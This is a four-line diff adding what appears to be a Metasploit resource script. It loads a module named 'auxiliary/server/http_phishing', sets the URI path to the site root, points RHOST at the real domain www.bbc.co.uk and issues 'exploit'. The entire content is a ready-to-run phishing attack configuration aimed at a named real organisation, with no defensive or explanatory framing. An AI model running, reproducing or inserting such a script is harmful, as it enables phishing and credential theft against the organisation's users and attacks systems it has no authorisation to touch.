@@ -1,0 +1,4 @@
+use auxiliary/server/http_phishing 
+set URIPATH /
+set RHOST www.bbc.co.uk
+exploit
